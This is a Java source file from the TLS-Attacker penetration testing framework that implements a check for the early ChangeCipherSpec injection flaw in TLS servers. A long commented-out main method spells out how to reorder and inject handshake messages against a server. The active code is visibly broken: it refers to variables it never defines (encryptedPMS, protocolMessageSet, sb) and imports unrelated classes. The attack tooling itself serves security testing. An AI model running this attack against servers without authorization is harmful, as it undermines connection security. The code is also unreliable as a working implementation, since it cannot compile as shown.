/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
 *
 * Copyright (C) 2015 Chair for Network and Data Security,
 *                    Ruhr University Bochum
 *                    (juraj.somorovsky@rub.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.BleichenbacherCommandConfig;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.attacks.config.EarlyCCSCommandConfig;
import de.rub.nds.tlsattacker.attacks.pkcs1.PKCS1VectorGenerator;
import de.rub.nds.tlsattacker.modifiablevariable.ModifiableVariable;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.tls.protocol.ccs.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.RSAClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.FinishedMessage;
import de.rub.nds.tlsattacker.tls.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.tls.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import de.rub.nds.tlsattacker.transport.TransportHandlerFactory;
import de.rub.nds.tlsattacker.transport.TransportHandlerType;
import de.rub.nds.tlsattacker.tls.config.CommandConfig;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.config.WorkflowTraceSerializer;
import de.rub.nds.tlsattacker.tls.constants.AlertDescription;
import de.rub.nds.tlsattacker.tls.constants.AlertLevel;
import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.tls.protocol.alert.AlertMessage;
import de.rub.nds.tlsattacker.tls.util.CertificateFetcher;
import de.rub.nds.tlsattacker.tls.util.LogLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.Security;
import java.security.interfaces.RSAPublicKey;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import javax.xml.bind.JAXBException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.jce.provider.BouncyCastleProvider;

/**
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class EarlyCCSAttack extends Attacker<EarlyCCSCommandConfig> {
    
    public static Logger LOGGER = LogManager.getLogger(EarlyCCSAttack.class);

    public EarlyCCSAttack(EarlyCCSCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
        TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	WorkflowTrace trace = tlsContext.getWorkflowTrace();
	RSAClientKeyExchangeMessage cke = (RSAClientKeyExchangeMessage) trace
		.getFirstHandshakeMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE);
	ModifiableByteArray epms = new ModifiableByteArray();
	epms.setModification(ByteArrayModificationFactory.explicitValue(encryptedPMS));
	cke.setEncryptedPremasterSecret(epms);
	try {
	    FileOutputStream fos = new FileOutputStream("/tmp/test.xml");
	    WorkflowTraceSerializer.write(fos, trace);
	} catch (IOException | JAXBException ex) {
	    ex.printStackTrace();
	}

	workflowExecutor.executeWorkflow();
	transportHandler.closeConnection();
	trace.getProtocolMessages().get(trace.getProtocolMessages().size() - 1);
	
	if (protocolMessageSet.size() == 1) {
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, Not vulnerable, one message found: {}", config.getConnect(),
		    sb.toString());
	} else {
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, Vulnerable (probably), found: {}", config.getConnect(),
		    sb.toString());
	}
    }
    
    // public static void main(String[] args) throws Exception {
    //
    // // start the server with ./openssl s_server -accept 51624 -key
    // // /home/developer/TLS-Attacker/resources/privkey1024.pem -cert
    // // /home/developer/TLS-Attacker/resources/server-cert1024.pem -debug
    // // ECC does not work properly in the NSS provider
    // Security.removeProvider("SunPKCS11-NSS");
    // Security.addProvider(new BouncyCastleProvider());
    //
    // ProtocolController controller = ProtocolController.getInstance();
    // TransportHandler th =
    // TransportHandlerFactory.createTransportHandler(TransportHandlerType.SIMPLE);
    // th.initialize("localhost", 51624);
    // controller.setTransportHandler(th);
    //
    // WorkflowConfigurationFactory factory =
    // WorkflowConfigurationFactory.createInstance(
    // WorkflowConfigurationFactory.TYPE.RSA, ProtocolVersion.TLS12);
    // WorkflowTrace workflow = factory.createHandshakeTlsContext();
    // controller.setWorkflowTrace(workflow);
    //
    // WorkflowExecutor executor =
    // WorkflowExecutorFactory.createWorkflowExecutor();
    // controller.setWorkflowExecutor(executor);
    //
    // // byte[] pmsBytes = new byte[48];
    // // pmsBytes[0] = 3;
    // // pmsBytes[1] = 3;
    // // // set explicit value for pms
    // // RSAClientKeyExchangeMessage cke1 = (RSAClientKeyExchangeMessage)
    // // workflow.getFirstHandshakeMessage(MessageType.CLIENT_KEY_EXCHANGE);
    // // ModifiableVariable<byte[]> pms = new ModifiableVariable<>();
    // //
    // pms.setModification(ByteArrayModificationFactory.explicitValue(pmsBytes));
    // // cke1.setPremasterSecret(pms);
    // // remove the original CCS (make it non-executable)
    // ProtocolMessage mb1 =
    // workflow.getFirstProtocolMessage(ProtocolMessageType.CHANGE_CIPHER_SPEC);
    // mb1.setGoingToBeSent(false);
    //
    // // create a new CCS and place it directly behind the ServerHelloDone
    // workflow.getProtocolMessages().add(4, new
    // ChangeCipherSpecMessage(ConnectionEnd.CLIENT));
    //
    // // ClientKeyExchange message, non-executable. It is there to initialize
    // // the master_secret
    // RSAClientKeyExchangeMessage cke = new
    // RSAClientKeyExchangeMessage(ConnectionEnd.CLIENT);
    // ModifiableVariable<byte[]> ms = new ModifiableVariable<>();
    // ms.setModification(ByteArrayModificationFactory.explicitValue(new
    // byte[48]));
    // //
    // ms.getModification().setModificationFilter(ModificationFilterFactory.access(new
    // // int[]{3}));
    // cke.setMasterSecret(ms);
    // // cke.setPremasterSecret(pms);
    // cke.setGoingToBeSent(false);
    // workflow.getProtocolMessages().add(5, cke);
    // // FinishedMessage, non-executable. It is there to initialize the Record
    // // Layer Encryption
    // FinishedMessage fin = new FinishedMessage(ConnectionEnd.CLIENT);
    // fin.setGoingToBeSent(false);
    // workflow.getProtocolMessages().add(6, fin);
    //
    // // next, CKE and Fin messages are going to be executed. Both are going
    // // to be encrypted.
    // // since CCS has already been sent to the server, the CKE has also to be
    // // encrypted
    // // at least with the tested 1.0.1 version
    // executor.executeWorkflow();
    // }
}
